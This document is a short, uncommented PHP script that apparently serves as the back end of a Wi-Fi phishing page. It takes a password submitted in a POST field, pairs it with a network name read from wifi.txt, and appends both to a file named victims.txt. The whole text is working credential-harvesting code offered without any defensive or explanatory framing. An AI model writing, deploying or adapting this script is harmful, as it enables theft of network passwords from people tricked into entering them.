<?php
$p = $_POST['pass'];
$r = fread(fopen('wifi.txt','r'),filesize('wifi.txt'));
$u = explode(":",$r)[1];
fwrite(fopen('victims.txt','a+'),$u.'<!:!>'.$p."\n");
